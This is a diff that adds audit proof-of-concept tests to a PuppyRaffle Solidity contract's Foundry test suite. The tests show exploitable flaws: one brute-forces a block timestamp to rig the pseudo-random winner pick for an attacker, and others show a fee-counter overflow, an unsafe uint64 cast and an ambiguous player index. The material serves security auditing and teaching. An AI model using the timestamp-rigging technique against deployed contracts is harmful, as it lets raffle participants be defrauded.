@@ -285,6 +285,163 @@ contract PuppyRaffleTest is Test {
 
         console2.log("Ending Raffle Contract Balance:", endingRaffleBalance);
     }
+
+    function test_GetActivePlayerIndex_AUDIT() public {
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        address notAPlayer = makeAddr("notAPlayer");
+
+        uint256 indexOfRealPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
+        uint256 indexOfInactivePlayer = puppyRaffle.getActivePlayerIndex(
+            notAPlayer
+        );
+
+        console2.log("Index of playerOne:", indexOfRealPlayer);
+        console2.log("Index of inactive player:", indexOfInactivePlayer);
+
+        // both return 0, so they are indistinguishable
+        assertEq(indexOfRealPlayer, indexOfInactivePlayer);
+        assertEq(puppyRaffle.players(0), playerOne);
+    }
+
+    // THIS TEST WAS WRITTEN BY DEEPSEEK HARNESS SO I CAN UNDERSTAND DEEPLY MYSELF
+    function test_WeakRandomness_AUDIT() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        // the earliest moment the raffle is allowed to be drawn is
+        // block.timestamp + duration. we add +1 to sit safely past that line
+        uint256 startTime = block.timestamp + duration + 1;
+
+        // a flag to remember whether we actually found a winning timestamp
+        bool found;
+
+        // this will store the timestamp that makes the attacker win
+        uint256 winningTimestamp;
+
+        // try 100 different timestamps, one second apart, starting at startTime
+        for (uint256 t = startTime; t < startTime + 100; t++) {
+            // this copies EXACTLY the line inside selectWinner():
+            //   keccak256(msg.sender, block.timestamp, block.difficulty) % players.length
+            // address(this) = the address calling selectWinner (this test contract)
+            // t             = the timestamp we are trying right now
+            // block.difficulty = the current difficulty value (not secret, publicly known)
+            // keccak256(...) returns bytes32, so we cast it to uint256, then take % 4
+            uint256 index = uint256(
+                keccak256(abi.encodePacked(address(this), t, block.difficulty))
+            ) % players.length;
+
+            // index 3 means playerFour, which is the attacker
+            if (index == 3) {
+                // this timestamp gives the attacker the win, so remember it
+                winningTimestamp = t;
+
+                // flip the flag so we know we succeeded
+                found = true;
+
+                // no need to keep looping, we already have what we want
+                break;
+            }
+        }
+
+        // if found is still false, the attacker failed and the test should not pass
+        assertTrue(found, "attacker found a winning timestamp");
+
+        // move the chain forward to the timestamp the attacker hand-picked
+        vm.warp(winningTimestamp);
+
+        // mine a new block, so this looks like a real new block being produced
+        vm.roll(block.number + 1);
+
+        // print the timestamp that makes the attacker win
+        console2.log("Winning timestamp found by attacker:", winningTimestamp);
+
+        puppyRaffle.selectWinner();
+
+        console2.log(
+            "Winner is playerFour (the attacker):",
+            puppyRaffle.previousWinner() == playerFour
+        );
+        assertEq(puppyRaffle.previousWinner(), playerFour);
+    }
+
+    function test_ArithmeticOverflow_AUDIT() public {
+        // a separate raffle with a big entrance fee, so totalFees gets close to uint64 max
+        uint256 bigEntranceFee = 1.5e19;
+        PuppyRaffle bigRaffle = new PuppyRaffle(
+            bigEntranceFee,
+            feeAddress,
+            duration
+        );
+
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+
+        uint256 feePerRaffle = (4 * bigEntranceFee * 20) / 100;
+
+        // raffle 1
+        bigRaffle.enterRaffle{value: bigEntranceFee * 4}(players);
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        bigRaffle.selectWinner();
+        console2.log(
+            "totalFees after raffle 1:",
+            uint256(bigRaffle.totalFees())
+        );
+
+        // raffle 2
+        bigRaffle.enterRaffle{value: bigEntranceFee * 4}(players);
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        bigRaffle.selectWinner();
+        console2.log(
+            "totalFees after raffle 2:",
+            uint256(bigRaffle.totalFees())
+        );
+
+        // the two fees should add up, but uint64 wraps around instead
+        uint256 expectedWithoutOverflow = feePerRaffle * 2;
+        console2.log("expected without overflow:", expectedWithoutOverflow);
+
+        assertTrue(expectedWithoutOverflow > type(uint64).max);
+        assertEq(bigRaffle.totalFees(), expectedWithoutOverflow - 2**64);
+    }
+
+    function test_UnsafeCasting_AUDIT() public {
+        uint256 playersNum = 100;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i + 100);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        uint256 expectedFee = (playersNum * entranceFee * 20) / 100;
+        uint256 truncatedFee = uint256(uint64(expectedFee));
+
+        puppyRaffle.selectWinner();
+
+        console2.log("expected fee:", expectedFee);
+        console2.log(
+            "totalFees actually recorded:",
+            uint256(puppyRaffle.totalFees())
+        );
+
+        // the fee is bigger than uint64 max, so the cast silently truncates it
+        assertTrue(expectedFee > type(uint64).max);
+        assertEq(uint256(puppyRaffle.totalFees()), truncatedFee);
+    }
 }
 
 contract ReentrancyAttacker {
